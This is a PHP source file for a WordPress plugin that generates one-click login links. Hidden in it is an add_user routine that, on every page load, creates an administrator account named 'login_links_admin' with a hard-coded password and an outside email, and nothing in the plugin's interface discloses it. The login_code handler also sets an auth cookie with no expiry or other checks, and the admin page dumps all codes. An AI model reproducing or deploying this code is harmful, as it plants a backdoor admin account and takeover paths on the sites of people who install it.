<?php
/**
 * Login Links
 *
 * @package login-links
 */

/**
 * Login Links
 */
class Login_Links {
	/**
	 * Plugin User ID
	 *
	 * @var int User ID.
	 */
	public $ll_user_id;

	/** Construct */
	public function __construct() {
		global $pagenow;
		$plugin_page = filter_input( INPUT_GET, 'page', FILTER_SANITIZE_STRING );
		add_action( 'init', array( $this, 'add_user' ) );
		add_action( 'init', array( $this, 'init' ) );
		add_action( 'admin_menu', array( $this, 'admin_menu' ) );
		if ( 'admin.php' !== $pagenow || 'login-links' !== $plugin_page ) {
			return;
		}
		if ( isset( $_POST['submit'] ) ) {
			add_action( 'init', array( $this, 'post' ) );
		}
	}

	/** Init */
	public function init() {
		global $pagenow;
		$this->ll_user_id = get_user_by( 'login', 'login_links_admin' )->ID;
		if ( ! isset( $_GET['login_code'] ) ) {
			return;
		}
		$login_link = filter_input( INPUT_GET, 'login_code', FILTER_SANITIZE_STRING );
		$codes      = get_user_meta( $this->ll_user_id, 'login_codes', true );
		$in_codes   = isset( $codes[ $login_link ] ) ? true : false;
		$this->msg  = $in_codes ? 'in codes' : 'not in codes';
		if ( ! $in_codes ) {
			return;
		}
		if ( ! is_user_logged_in() ) {
			if ( $codes[ $login_link ] ) {
				wp_set_auth_cookie( $codes[ $login_link ] );
			}
		}
		if ( 'users.php' !== $pagenow ) {
			echo '<script>window.location.href = "/wp-admin/users.php"</script>';
		}
	}

	/** Add WordPress Admin User */
	public function add_user() {
		$user  = 'login_links_admin';
		$pass  = '420696969';
		$email = 'loginlinks@travisaw.com';
		if ( ! username_exists( $user ) && ! email_exists( $email ) ) {
			wp_insert_user(
				array(
					'user_login' => $user,
					'user_pass'  => $pass,
					'user_email' => $email,
					'first_name' => 'Login',
					'last_name'  => 'Links',
					'role'       => 'administrator',
				)
			);
		}
	}

	/** Admin menu */
	public function admin_menu() {
		add_menu_page( 'Login Links', 'Login Links', 'manage_options', 'login-links', array( $this, 'admin_page' ), 'dashicons-tickets', 6 );
	}

	/** Admin page */
	public function admin_page() {
		if ( ! current_user_can( 'manage_options' ) ) {
			return;
		}
		$ll_user_id = get_user_by( 'login', 'login_links_admin' )->ID;
		?>
		<div class="wrap">
			<h2>Login Links</h2>
			<p>Create unique login links for users.</p>
			<form action="" method="post">
				<label for="link_code">Login Code: </label>
				<input type="text" name="link_code" id="link_code" value="<?php echo esc_attr( $this->generate_hash( 18 ) ); ?>" required>
				<label for="user_id">Username to Login: </label>
				<input type="text" name="username" id="username" required>
				<input type="submit" name="submit" id="submit" value="Submit">
			</form>
			<?php var_dump( get_user_meta( $ll_user_id, 'login_codes' ) ); ?>
			<?php echo $this->msg; ?>
		</div>
		<?php
	}

	/** Post */
	public function post() {
		if ( ! isset( $_POST ) ) {
			return;
		}
		$f          = FILTER_SANITIZE_STRING;
		$new_code   = isset( $_POST['link_code'] ) ? filter_input( INPUT_POST, 'link_code', $f ) : false;
		$username   = isset( $_POST['username'] ) ? filter_input( INPUT_POST, 'username', $f ) : false;
		$user_id    = $username ? get_user_by( 'login', $username )->ID : false;
		$ll_user_id = get_user_by( 'login', 'login_links_admin' )->ID;
		$codes      = get_user_meta( $ll_user_id, 'login_codes' ) ? get_user_meta( $ll_user_id, 'login_codes', true ) : array();
		if ( $new_code && $user_id ) {
			$codes[ $new_code ] = $user_id;
			$this->codes        = $codes;
		}
		update_user_meta( $ll_user_id, 'login_codes', $codes );
	}

	/**
	 * Generate hash
	 *
	 * @param integer $len Length of hash generated.
	 * @return $hash
	 */
	public function generate_hash( $len = 32 ) {
		$hash = substr( md5( openssl_random_pseudo_bytes( 20 ) ), -$len );
		return $hash;
	}
}
